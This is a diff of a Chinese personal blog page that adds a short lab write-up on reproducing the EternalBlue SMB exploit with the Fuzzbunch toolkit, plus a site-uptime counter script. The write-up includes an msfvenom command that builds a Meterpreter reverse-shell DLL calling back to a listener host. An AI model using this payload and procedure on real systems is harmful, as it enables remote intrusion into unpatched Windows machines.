@@ -159,6 +159,129 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-永恒之蓝复现过程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/17/永恒之蓝复现过程/">永恒之蓝复现过程</a>
+    </h1>
+  
+
+        
+        <a href="/2018/09/17/永恒之蓝复现过程/" class="archive-article-date">
+  	<time datetime="2018-09-17T10:54:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-17</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/17/永恒之蓝复现过程/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-永恒之蓝复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p>title: 永恒之蓝复现过程<br>date: 2018-09-17 18:50:24<br>tags:<br>　　　漏洞原理：<a href="http://blogs.360.cn/blog/nsa-eternalblue-smb/" target="_blank" rel="noopener">http://blogs.360.cn/blog/nsa-eternalblue-smb/</a><br>　　　目前已知受影响的 Windows 版本包括但不限于：Windows NT，Windows 2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。<br>　　　Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。<br>　　　攻击机：win7 x32    192.168.1.246<br>　　　获得shell机：kali  192.168.1.120<br>　　　靶机：win7 x64      192.168.1.108<br>前期准备：<br>1、 在win7 x32上安装python2.6<br>　　　安装PyWin32 v212，管理员权限安装<br>2、 更改脚本文件中的同时修改FuzzyBunch.xml文件内容，设置相应的ResourcesDir和LogDir参数值：</p>
+<p>3、测试fb.py文件是否可以运行</p>
+<p>4、在kali上设置监听地址及端口：<br>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=8888 -f dll &gt;s.dll  ，生成文件到当前目录</p>
+<p>5、将生成的文件放到win7攻击机的c盘根目录下<br>Fuzzbunch基本配置<br>1、设置目标地址和攻击地址</p>
+<p>2、根据project提示建立新的项目，这里项目名称为fuxian</p>
+<p>3、使用永恒之蓝模块，接下来就回车默认配置</p>
+<p>4、这里基本都直接回车</p>
+<p>5、箭头处根据提示目标主机系win7，使用FB</p>
+<p>最后配置：<br>1、根据之前的msfvenom配置msf</p>
+<p>2、切换到win7攻击机，使用模块</p>
+<p>3、配置攻击系统</p>
+<p>4、回到kali中，可以看到有会话，成功</p>
+<p>5、接下来看兴趣操作就好</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/09/17/永恒之蓝复现/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-登陆织梦后台密码输入正确却提示密码错误" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -289,6 +412,22 @@
     </div>
   </div>
 </footer>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("02/14/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterva
     </div>
     <script>
 	var yiliaConfig = {
